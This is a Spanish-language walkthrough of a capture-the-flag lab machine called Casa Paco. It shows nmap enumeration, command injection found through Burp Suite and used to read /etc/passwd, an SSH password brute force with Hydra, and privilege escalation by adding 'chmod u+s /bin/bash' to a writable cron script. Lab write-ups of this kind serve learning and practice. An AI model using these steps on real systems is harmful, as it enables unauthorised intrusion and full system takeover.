---
tags:
  - Cybersecurity
  - Labs
  - TheHackerLabs
  - Easy
  - Linux
  - BurpSuite
  - Hydra
  - SSH
  - PrivilegeEscalation
  - CRON
---
- [[#Enumeración|Enumeración]]
	- [[#Enumeración#Ping|Ping]]
	- [[#Enumeración#Nmap|Nmap]]
	- [[#Enumeración#HTTP|HTTP]]
		- [[#HTTP#Fuzzing Web|Fuzzing Web]]
		- [[#HTTP#Burp Suite|Burp Suite]]
- [[#Explotación|Explotación]]
	- [[#Explotación#Hydra|Hydra]]
	- [[#Explotación#SSH|SSH]]
	- [[#Explotación#Escalada de Privilegios|Escalada de Privilegios]]
		- [[#Escalada de Privilegios#Tarea CRON|Tarea CRON]]

---
# Resolviendo la máquina Casa Paco

>En esta publicación, comparto cómo resolví la máquina **Casa Paco** de [The Hackers Labs](https://labs.thehackerslabs.com/machine/18).

---
## Enumeración
### Ping

Ejecutamos un *ping* para comprobar la conectividad y obtener pistas sobre el sistema operativo.

`ping -c 1 192.168.1.138`

![[Pasted image 20250721192326.png]]

*TTL=64* -> **Linux**
### Nmap

`nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 192.168.1.138 -oG allPorts`

![[Pasted image 20250721192500.png]]

`nmap -p22,80 -sCV 192.168.1.138 -oN targeted`

![[Pasted image 20250721192515.png]]
### HTTP

`http://192.168.1.138`

![[Pasted image 20250721192606.png]]

`echo "192.168.1.138 casapaco.thl" >> /etc/hosts`

![[Pasted image 20250721192728.png]]
#### Fuzzing Web

Se realiza *fuzzing web*, pero no se obtiene ningún resultado.
#### Burp Suite

Se procede a mirar en la web, y se encuentra el siguiente directorio: `http://casapaco.thl/llevar.php`.

![[Pasted image 20250721195041.png]]

Se procede a realizar un análisis con *Burp Suite*.

![[Pasted image 20250721195141.png]]

Se observa que al realizar un pedido de prueba, pone "Salida de comando".

Se prueba si podemos listar contenido.

![[Pasted image 20250721195257.png]]

Al intentar listar el el archivo *llevar.php*, no se consigue nada.

![[Pasted image 20250721195418.png]]

Anteriormente, se observa que existe un archivo llamado *llevar1.php*.

Se procede a realizar la misma prueba que se realizó anteriormente, pero con el archivo mencionado.

![[Pasted image 20250721195558.png]]

Se observa que funciona, además de ver el bloqueo de comandos que tiene el archivo *llevar.php*.

Se procede a listar el archivo *llevar1.php* y se observa que no tiene el bloqueo de comandos.

![[Pasted image 20250721195754.png]]

Se procede a listar el archivo: `/etc/passwd`, para averiguar usuarios en el sistema.

![[Pasted image 20250721195910.png]]

Se listan los usuarios y se encuentra *pacogerente*.

---
## Explotación
### Hydra

Se procede a realizar *fuerza bruta* en el servicio **SSH**.

`hydra -l pacogerente -P /usr/share/wordlists/rockyou.txt 192.168.1.138 ssh -t 64`

![[Pasted image 20250721202839.png]]
### SSH

`ssh pacogerente@192.168.1.138`

![[Pasted image 20250721210344.png]]
### Escalada de Privilegios
#### Tarea CRON
Se realiza una búsqueda y se encuentra, dos archivos: `fabada.sh` y `log.txt`.

`ls`

![[Pasted image 20250721210515.png]]

Se visualizan los dos archivos.

`cat log.txt`

![[Pasted image 20250721210621.png]]

`cat fabada.sh`

![[Pasted image 20250721210648.png]]

Se verifica si el archivo (`fabada.sh`) puede ser editado.

`ls -la`

![[Pasted image 20250721210953.png]]

Se edita el archivo `fabada.sh`, añadiendo la línea de comando `chmod u+s /bin/bash`.

`nano fabada.sh`

`cat fabada.sh`

![[Pasted image 20250721211100.png]]

Se espera a que pase la tarea **CRON**.

`cat log.txt`

![[Pasted image 20250721211144.png]]

`bash -p`

![[Pasted image 20250721211207.png]]

---
